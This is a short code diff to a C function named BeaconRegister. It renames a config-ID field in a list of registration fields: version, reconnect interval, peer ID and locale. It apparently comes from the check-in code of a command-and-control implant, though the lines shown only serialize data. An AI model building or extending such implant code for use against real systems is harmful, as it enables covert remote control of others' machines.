@@ -230,7 +230,7 @@ BOOL BeaconRegister
 	ElementList[11] = CreateBytesElement(lpVersion, lstrlenA(lpVersion), 12);
 	ElementList[12] = CreateVarIntElement(pBeacon->pGlobalConfig->dwReconnectInterval, 13);
 
-	ElementList[14] = CreateBytesElement(pBeacon->pGlobalConfig->szConfigID, lstrlenA(pBeacon->pGlobalConfig->szConfigID), 16);
+	ElementList[14] = CreateBytesElement(pBeacon->pGlobalConfig->lpConfigID, lstrlenA(pBeacon->pGlobalConfig->lpConfigID), 16);
 	ElementList[15] = CreateVarIntElement(pBeacon->pGlobalConfig->uPeerID, 17);
 	ElementList[16] = CreateBytesElement(lpLocaleName, lstrlenA(lpLocaleName), 18);
 	
